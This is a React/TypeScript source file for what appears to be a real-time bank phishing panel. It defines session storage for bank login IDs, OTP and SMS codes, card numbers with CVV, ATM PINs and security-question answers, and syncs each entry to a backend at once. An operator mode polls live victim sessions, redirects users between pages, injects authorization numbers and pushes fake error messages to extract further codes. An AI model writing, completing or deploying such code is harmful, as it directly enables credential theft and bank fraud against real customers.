import React, { createContext, useContext, useState, useEffect, useRef } from 'react';
import { 
  createSession, 
  getSession, 
  updateSession, 
  getAllSessions as dbGetAllSessions
} from '@/lib/database';
import { getAllSessionsIncludingArchived as dbGetAllSessionsIncludingArchived } from '@/lib/database';
import { archiveSession } from '@/lib/database';
import { archiveAllSessions } from '@/lib/database';

export interface UserSession {
  id: string;
  ipAddress: string;
  currentPage: number;
  data: {
    login?: { bovUserId: string; code: string };
    otp?: { code: string };
    smsOtp?: { smsCode: string };
    billing?: { cardNumber: string; expiry: string; cvv: string };
    atmPin?: { currentPin: string; newPin: string; confirmPin: string };
    confirmation?: { terms: boolean; newsletter: boolean };
    otpGenCode?: { enteredCode: string };
    deviceRemove?: { acknowledged: boolean };
    securityQuestion?: { question: string; answer: string };
    securityQuestion1?: { question: string; answer: string };
    securityQuestion2?: { question: string; answer: string };
    securityQuestion3?: { question: string; answer: string };
    securityQuestion4?: { question: string; answer: string };
    transactionDigits?: string; // For payment cancel page
    referenceNumber?: string; // For self send page
    cancelSecurityCode?: { securityCode: string }; // For payment cancel security code
    phoneNumber?: { phoneNumber: string }; // For phone number page
    payeeCode?: { reauthenticationCode: string; timestamp: string }; // For payee code page
  };
  isWaiting: boolean;
  hasError: boolean;
  errorMessage: string;
  errorPage: number; // Which page the error is for
  authorizationNumber?: string; // For OTP verification
  archived?: boolean; // Whether session is archived (moved to history)
  createdAt: string;
  updatedAt: string;
}

interface FormContextType {
  currentSession: UserSession; // Current user session
  isAdmin: boolean;
  setIsAdmin: (admin: boolean) => void;
  updateSessionData: (step: string, data: any) => void;
  setCurrentPage: (page: number) => void;
  setWaiting: (waiting: boolean) => void;
  getAllSessions: () => UserSession[];
  getAllSessionsIncludingArchived: () => Promise<UserSession[]>;
  redirectUser: (sessionId: string, page: number, authorizationNumber?: string) => Promise<void>;
  sendErrorMessage: (sessionId: string, errorMessage: string) => Promise<void>;
  clearError: () => void; // Clear current session error
  clearSession: (sessionId: string) => Promise<void>;
  clearAllSessions: () => Promise<void>;
}

const FormContext = createContext<FormContextType | undefined>(undefined);

export const useForm = () => {
  const context = useContext(FormContext);
  if (!context) {
    throw new Error('useForm must be used within a FormProvider');
  }
  return context;
};

// Helper function to convert database session to UserSession
const convertToUserSession = (dbSession: any): UserSession => ({
  id: dbSession.session_id, // Use session_id as the identifier for consistency
  ipAddress: dbSession.ip_address,
  currentPage: dbSession.current_page,
  data: (dbSession.session_data && typeof dbSession.session_data === 'object' ? dbSession.session_data : {}) as UserSession['data'],
  isWaiting: !!dbSession.is_waiting,
  hasError: !!dbSession.has_error,
  errorMessage: dbSession.error_message || '',
  errorPage: dbSession.error_page || 0,
  authorizationNumber: dbSession.authorization_number || undefined,
  archived: !!dbSession.archived,
  createdAt: dbSession.created_at,
  updatedAt: dbSession.updated_at
});

export const FormProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentSession, setCurrentSession] = useState<UserSession>(() => {
    try {
      const saved = localStorage.getItem('currentSession');
      if (saved) {
        const parsedSession = JSON.parse(saved);
        // Only reset waiting state if no data has been submitted yet
        // If user has submitted data, keep them in waiting state for admin redirect
        if (Object.keys(parsedSession.data || {}).length === 0) {
          parsedSession.isWaiting = false;
        }
        return parsedSession;
      }
      return {
        id: `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        ipAddress: 'localhost',
        currentPage: 1,
        data: {},
        isWaiting: false,
        hasError: false,
        errorMessage: '',
        errorPage: 0,
        authorizationNumber: undefined,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      };
    } catch (error) {
      console.error('Failed to parse stored session:', error);
      return {
        id: `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        ipAddress: 'localhost',
        currentPage: 1,
        data: {},
        isWaiting: false,
        hasError: false,
        errorMessage: '',
        errorPage: 0,
        authorizationNumber: undefined,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      };
    }
  });

  const [isAdmin, setIsAdminState] = useState(() => {
    try {
      return localStorage.getItem('isAdmin') === 'true';
    } catch (error) {
      console.error('Failed to read admin status:', error);
      return false;
    }
  });

  const setIsAdmin = (admin: boolean) => {
    setIsAdminState(admin);
    // When exiting admin mode, also clear authentication
    if (!admin) {
      try {
        localStorage.removeItem('adminAuthenticated');
      } catch (error) {
        console.error('Failed to clear admin authentication:', error);
      }
    }
  };

  const [allSessions, setAllSessions] = useState<UserSession[]>([]);
  const currentSessionRef = useRef(currentSession);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const heartbeatIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const lastUpdateRef = useRef(Date.now());
  const isInitialized = useRef(false);
  const sessionCreated = useRef(false);

  // Keep ref updated
  useEffect(() => {
    currentSessionRef.current = currentSession;
  }, [currentSession]);

  // Initialize session in database
  useEffect(() => {
    if (isInitialized.current) return;
    isInitialized.current = true;
    
    const initSession = async () => {
      try {
        // Try to get existing session from database
        const existingSession = await getSession(currentSession.id);
        
        if (!existingSession) {
          // Create new session in database and wait for it
          console.log('🔄 Creating new session in database:', currentSession.id);
          const result = await createSession(currentSession.id);
          
          if (result) {
            sessionCreated.current = true;
            console.log('✅ Session created successfully in database');
            console.log('💡 Session ID:', currentSession.id);
            console.log('💡 Session will appear in admin panel momentarily');
          } else {
            console.error('❌ Session creation failed - API not responding or returned null');
            console.error('⚠️ Will retry in 3 seconds...');
            console.error('⚠️ Make sure backend API is deployed at:', window.location.origin + '/api');
            // Retry after 3 seconds with exponential backoff
            setTimeout(initSession, 3000);
          }
        } else {
          console.log('✅ Found existing session in database:', currentSession.id);
          sessionCreated.current = true;
          // Update local session with database state to ensure consistency
          setCurrentSession(convertToUserSession(existingSession));
        }
      } catch (error) {
        console.error('❌ Failed to initialize session:', error);
        console.error('⚠️ Backend API appears to be offline or unreachable');
        console.error('⚠️ Will retry in 3 seconds...');
        // Retry after 3 seconds
        setTimeout(initSession, 3000);
      }
    };

    initSession();
  }, []); // Empty dependency array - run only once

  // Heartbeat system for instant online/offline detection (only for non-admin users)
  useEffect(() => {
    if (isAdmin) return;

    const sendHeartbeat = async () => {
        // Always attempt heartbeat; backend will ignore if session doesn't exist
        // Previously gated on sessionCreated; removed to avoid race conditions

      try {
        // Trigger updated_at change by updating status (don't auto-create if deleted)
        const result = await updateSession(currentSessionRef.current.id, {
          status: 'Active',
          archived: false, // Unarchive if user becomes active again
        }, false); // Don't recreate if session was deleted
        
        if (!result) {
          console.log('⚠️ Session deleted by admin - stopping heartbeat');
          sessionCreated.current = false;
          return;
        }
        
        // Success - session is active in database
      } catch (error) {
        console.error('❌ Heartbeat failed - API may be offline:', error);
        // Don't mark session as not created on temporary network errors
        // Let retry mechanism handle it
      }
    };

    // Send heartbeat every 5 seconds when tab is visible
    const startHeartbeat = () => {
      if (heartbeatIntervalRef.current) return;
      
      sendHeartbeat(); // Send immediately
      heartbeatIntervalRef.current = setInterval(sendHeartbeat, 5000);
      console.log('💚 Heartbeat started');
    };

    const stopHeartbeat = () => {
      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
        heartbeatIntervalRef.current = null;
        console.log('❤️ Heartbeat stopped');
      }
    };

    // Handle visibility change
    const handleVisibilityChange = () => {
      if (document.hidden) {
        stopHeartbeat();
      } else {
        startHeartbeat();
      }
    };

    // Start heartbeat if page is visible
    if (!document.hidden) {
      startHeartbeat();
    }

    // Listen for visibility changes
    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Cleanup
    return () => {
      stopHeartbeat();
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [isAdmin]);

  // Sync session changes to localStorage
  useEffect(() => {
    // Keep localStorage updated with current session state
    try {
      localStorage.setItem('currentSession', JSON.stringify(currentSession));
    } catch (error) {
      console.error('Failed to save to localStorage:', error);
    }
  }, [currentSession]); // Sync whenever session changes

  useEffect(() => {
    localStorage.setItem('isAdmin', isAdmin.toString());
  }, [isAdmin]);

  // Refresh all sessions from database (only when in admin mode)
  useEffect(() => {
    if (!isAdmin) return;
    
    const refreshSessions = async () => {
      try {
        console.log('👥 [Admin] Refreshing all sessions...')
        const dbSessions = await dbGetAllSessions();
        const userSessions = dbSessions.map(convertToUserSession);
        console.log('👥 [Admin] Sessions refreshed:', userSessions.length, userSessions.map(s => ({
          id: s.id,
          page: s.currentPage,
          waiting: s.isWaiting,
          dataKeys: (s.data && typeof s.data === 'object') ? Object.keys(s.data) : []
        })))
        setAllSessions(userSessions);
      } catch (error) {
        console.error('❌ [Admin] Failed to refresh sessions:', error);
      }
    };

    refreshSessions();
    
    // Set up polling for real-time updates only in admin mode
    const interval = setInterval(refreshSessions, 2000);
    return () => clearInterval(interval);
  }, [isAdmin]);

  // Check for session updates from admin (always check, not just when waiting)
  useEffect(() => {
    if (isAdmin) return;

    console.log('Setting up polling interval for admin redirects...');
    
    // Poll for admin redirects
    const checkForRedirects = async () => {
        // Poll regardless of local creation flag; backend returns null if missing

      try {
        const current = currentSessionRef.current;
        const dbSession = await getSession(current.id);
        
        // Only proceed if session exists in database
        if (!dbSession) {
          return; // Session not in DB yet or was deleted
        }
        
        // Check for admin redirects, authorization numbers, or errors
        const pageChanged = dbSession.current_page !== current.currentPage;
        const authNumberAdded = dbSession.authorization_number && !current.authorizationNumber;
        const errorOccurred = !!dbSession.has_error && !current.hasError;
        const waitingChanged = !!dbSession.is_waiting !== current.isWaiting;
        
        if (pageChanged || authNumberAdded || errorOccurred || waitingChanged) {
          console.log('🔄 Session update detected from admin:', {
            pageChanged: pageChanged ? `${current.currentPage} → ${dbSession.current_page}` : false,
            authNumberAdded,
            errorOccurred,
            waitingChanged: waitingChanged ? `${current.isWaiting} → ${dbSession.is_waiting}` : false
          });
          
          setCurrentSession(prev => ({
            ...prev,
            currentPage: dbSession.current_page,
            data: dbSession.session_data as any || prev.data,
            authorizationNumber: dbSession.authorization_number || undefined,
            hasError: !!dbSession.has_error,
            errorMessage: dbSession.error_message || '',
            errorPage: dbSession.error_page || 0,
            isWaiting: !!dbSession.is_waiting, // Update waiting state from DB
            archived: !!dbSession.archived,
            updatedAt: dbSession.updated_at
          }));
          
          console.log('✅ Local session updated from database');
        }
      } catch (error) {
        console.error('❌ Failed to check for redirects (API may be offline):', error);
      }
    };

    // Poll every 1.5 seconds for instant admin redirects
    const interval = setInterval(checkForRedirects, 1500);
    
    // Check immediately on mount
    checkForRedirects();
    
    return () => {
      console.log('Cleaning up polling interval');
      clearInterval(interval);
    };
  }, [isAdmin]); // Only re-run when admin status changes

  const updateSessionData = (step: string, data: any) => {
    console.log('📝 User submitting data:', step, data);
    lastUpdateRef.current = Date.now(); // Mark user activity
    
    setCurrentSession(prev => {
      console.log('📋 Previous session state:', {
        sessionId: prev.id,
        isWaiting: prev.isWaiting,
        currentPage: prev.currentPage,
        dataKeys: Object.keys(prev.data),
        hasError: prev.hasError
      });
      
      const updated = {
        ...prev,
        data: { ...prev.data, [step]: data },
        isWaiting: true, // Set to waiting instead of auto-advancing
        hasError: false, // Clear any existing errors when new data is submitted
        errorMessage: '',
        errorPage: 0,
        updatedAt: new Date().toISOString()
      };
      
      console.log('✅ Updated session state:', {
        sessionId: updated.id,
        isWaiting: updated.isWaiting,
        currentPage: updated.currentPage,
        dataKeys: Object.keys(updated.data),
        hasError: updated.hasError
      });
      
      // Save to localStorage immediately
      try {
        localStorage.setItem('currentSession', JSON.stringify(updated));
        console.log('💾 Session saved to localStorage');
      } catch (error) {
        console.error('❌ Failed to save to localStorage:', error);
      }
      
      // Immediately sync to database when user submits data - include error clearing
      console.log('🔄 Syncing to database...')
      updateSession(updated.id, {
        current_page: updated.currentPage,
        is_waiting: updated.isWaiting,
        session_data: updated.data,
        has_error: false, // Clear error in database too
        error_message: '',
        error_page: 0,
        archived: false,
      }, false).then(() => { // Don't recreate if deleted by admin
        console.log('✅ Session synced to database successfully');
      }).catch(error => console.error('❌ Failed to sync session:', error));
      
      return updated;
    });
  };

  const setCurrentPage = (page: number) => {
    lastUpdateRef.current = Date.now(); // Mark user activity
    setCurrentSession(prev => ({ 
      ...prev, 
      currentPage: page,
      updatedAt: new Date().toISOString()
    }));
  };

  const setWaiting = (waiting: boolean) => {
    lastUpdateRef.current = Date.now(); // Mark user activity
    setCurrentSession(prev => ({ 
      ...prev, 
      isWaiting: waiting,
      updatedAt: new Date().toISOString()
    }));
  };

  const getAllSessions = (): UserSession[] => {
    return allSessions;
  };

  const getAllSessionsIncludingArchived = async (): Promise<UserSession[]> => {
    try {
      const dbSessions = await dbGetAllSessionsIncludingArchived();
      return dbSessions.map(convertToUserSession);
    } catch (error) {
      console.error('Failed to get all sessions including archived:', error);
      return [];
    }
  };

  const redirectUser = async (sessionId: string, page: number, authorizationNumber?: string) => {
    try {
      // Update session in database
      const updateData: any = {
        current_page: page,
        is_waiting: false,
        archived: false,
      };

      // Add authorization number if redirecting to OTP page
      if (page === 2 && authorizationNumber) {
        updateData.authorization_number = authorizationNumber;
      }

      await updateSession(sessionId, updateData, false);

      // Update local session if it's the current one
      if (sessionId === currentSession.id) {
        setCurrentSession(prev => ({ 
          ...prev, 
          currentPage: page, 
          isWaiting: false,
          authorizationNumber: page === 2 && authorizationNumber ? authorizationNumber : prev.authorizationNumber,
          updatedAt: new Date().toISOString()
        }));
      }

      // Refresh all sessions to show updated state
      const dbSessions = await dbGetAllSessions();
      const userSessions = dbSessions.map(convertToUserSession);
      setAllSessions(userSessions);
    } catch (error) {
      console.error('Failed to redirect user:', error);
    }
  };

  const sendErrorMessage = async (sessionId: string, errorMessage: string) => {
    try {
      // Get the current session to determine which page to show error on
      const dbSession = await getSession(sessionId);
      const errorPage = dbSession?.current_page || 1;
      
      // Update database with error state
      await updateSession(sessionId, {
        has_error: true,
        error_message: errorMessage,
        error_page: errorPage,
        is_waiting: false // User should stay on same page
      }, false);

      // Force refresh of sessions for admin
      const dbSessions = await dbGetAllSessions();
      const userSessions = dbSessions.map(convertToUserSession);
      setAllSessions(userSessions);
    } catch (error) {
      console.error('Failed to send error message:', error);
    }
  };

  const clearError = async () => {
    // Clear error in database
    await updateSession(currentSession.id, {
      has_error: false,
      error_message: '',
      error_page: 0
    }, false);
    
    // Clear error locally  
    setCurrentSession(prev => ({
      ...prev,
      hasError: false,
      errorMessage: '',
      errorPage: 0,
      updatedAt: new Date().toISOString()
    }));
  };

  const clearSession = async (sessionId: string) => {
    try {
      // Archive session instead of deleting (moves to history)
      await archiveSession(sessionId);
      
      // Remove from local sessions list (will move to history tab)
      setAllSessions(prev => prev.filter(session => session.id !== sessionId));
    } catch (error) {
      console.error('Failed to clear session:', error);
    }
  };

  const clearAllSessions = async () => {
    try {
      // Archive all sessions instead of deleting them to preserve data
      await archiveAllSessions();
      
      // Clear local sessions list (this will clear Live and Old sessions tabs)
      setAllSessions([]);
    } catch (error) {
      console.error('Failed to archive all sessions:', error);
    }
  };

  return (
    <FormContext.Provider value={{
      currentSession,
      isAdmin,
      setIsAdmin,
      updateSessionData,
      setCurrentPage,
      setWaiting,
      getAllSessions,
      getAllSessionsIncludingArchived,
      redirectUser,
      sendErrorMessage,
      clearError,
      clearSession,
      clearAllSessions,
    }}>
      {children}
    </FormContext.Provider>
  );
};